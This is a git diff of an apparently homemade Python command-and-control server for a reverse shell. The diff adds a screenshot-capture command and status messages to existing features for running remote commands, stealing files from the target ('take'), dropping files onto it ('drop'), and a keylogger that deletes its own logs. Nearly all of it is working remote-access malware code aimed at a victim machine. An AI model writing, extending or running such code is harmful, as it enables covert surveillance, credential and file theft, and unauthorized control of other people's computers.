@@ -3,10 +3,10 @@
 import socket
 from termcolor import colored # python coloring library
 import time
-import os 
+import os
 # Library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 
-import json 
+import json
 # The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
 
 
@@ -34,6 +34,8 @@ def upload_file(file_name):
 
 	file = open(file_name, 'rb')
 
+	print(colored("[+] Droping file... ", 'green'))
+
 	trgt.send(file.read())
 
 
@@ -49,6 +51,8 @@ def download_file(file_name):
 	# anything, so if now it hangs(keeps on listening) for 1 sec,
 	# while loop will break --> indicating file data transfer is
 	# complete.
+
+	print(colored("[+] Taking file... ", 'green'))
 
 	data_small = trgt.recv(1024)
 
@@ -98,6 +102,8 @@ def shell():
 
 	global cmd
 
+	counter = 1
+
 	while True:
 
 		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
@@ -119,39 +125,41 @@ def shell():
 List of available Commands:
 ----------------------------------------------------------------------------------------
 
-exit                          :     To terminate session
+exit                          :    To terminate session
 
-clear (linux)                 :     To clear screen
+clear (linux)                 :    To clear screen
 
-cls (windows)                 :     To clear screen
+cls (windows)                 :    To clear screen
 
-mkdir <directory> 
-(linux/windows)               :     To make folders
+mkdir <directory>
+(linux/windows)               :    To make folders
 
 touch <file>
-(linux)                       :     To make files
+(linux)                       :    To make files
 
-echo "<something>"            :     To display line of text/string that are passed as an argument
+echo "<something>"            :    To display line of text/string that are passed as an argument
 
-echo "<something>" >/>> file  :     To redirect text to a file, make files
+echo "<something>" >/>> file  :    To redirect text to a file, make files
 (linux/windows)
 
 cd <directory>
-(linux/win)                   :     To change directory/folder
+(linux/win)                   :    To change directory/folder
 
-rm <file> (linux)             :     To remove files
+rm <file> (linux)             :    To remove files
 
-del <file> (windows)          :     To remove files
+del <file> (windows)          :    To remove files
 
-take <file> (linux/windows)   :     To exfiltrate file from trgt
+take <file> (linux/windows)   :    To exfiltrate file from trgt
 
-drop <file> (linux/windows)   :     To infiltrate file from C2 server to trgt
+drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
 
-keylogger on                  :     To start keylogger
+screenshot OR   ss            :    To take screenshot and self destructs the screenshot from trgt
 
-keylog dump                   :     To print keystrokes 
+keylogger on                  :    To start keylogger
 
-keylogger off                 :     To close keylogger and self destruct the logged file
+keylog dump                   :    To print keystrokes
+
+keylogger off                 :    To close keylogger and self destruct the logged file
 ''', 'green'))
 			print(colored('''
 You can also use other commands related to networking, etc for linux as well as windows
@@ -160,17 +168,17 @@ You can also use other commands related to networking, etc for linux as well as 
 ------------------------------------------------------------------------------------------
 ''','green'))
 
-		# Making folder/directory in linux and windows ✓ 
+		# Making folder/directory in linux and windows ✓
 		elif cmd[:5] == "mkdir" and len(cmd) > 1:
 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
-		# Making file in linux ✓ 
+		# Making file in linux ✓
 		elif cmd[:5] == "touch" and len(cmd) > 1:
 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
-		# Editing/writing on file on linux and windows ✓ 
+		# Editing/writing on file on linux and windows ✓
 		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>'):
 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt		
@@ -179,7 +187,7 @@ You can also use other commands related to networking, etc for linux as well as 
 		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>>'):
 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-		
+
 
 		# clearing screen in windows ✓
 		elif cmd[:3] == "cls" and len(cmd) > 1:
@@ -204,18 +212,54 @@ You can also use other commands related to networking, etc for linux as well as 
 			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
+		# Screenshot
+
+		# screenshot function is same as download as after all we would only 
+		# download the captured image from trgt as rev_shell gonna take the ss
+		elif (cmd[:10 ] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
+
+			file = open(f"screenshot{counter}.png", 'wb')
+
+			trgt.settimeout(5) # taking 5 second for maximum as taking screenshot via 					    # rev_shell and downloading it can take time.
+
+		        # if all file datas are sent and nothing left for download,
+        		# the socket will keep on listening, but will not receive
+		        # anything, so if now it hangs(keeps on listening) for 1 sec,
+		        # while loop will break --> indicating file data transfer is
+		        # complete.
+
+			print(colored("[+] Capturing screenshot ... ", 'green'))
+
+			data_small = trgt.recv(1024)
+
+			while data_small:
+
+				file.write(data_small)
+
+				try:
+
+					data_small = trgt.recv(1024)
+
+				except socket.timeout:
+
+					break
+
+			trgt.settimeout(None)
+			file.close()
+			counter += 1
+
 		# Exfiltration in trgt point of view  ✓
-		elif cmd[:4] == "take":
+		elif cmd[:4] == "take" and len(cmd) > 1:
 
 			download_file(cmd[5:])
 
 		# Infiltration in trgt point of view  ✓
-		elif cmd[:4] == "drop":
-		
+		elif cmd[:4] == "drop" and len(cmd) > 1:
+
 			upload_file(cmd[5:])
 
 		else:
-			result = recv_eff() # received response 
+			result = recv_eff() # received response
 			print(result)
 
 
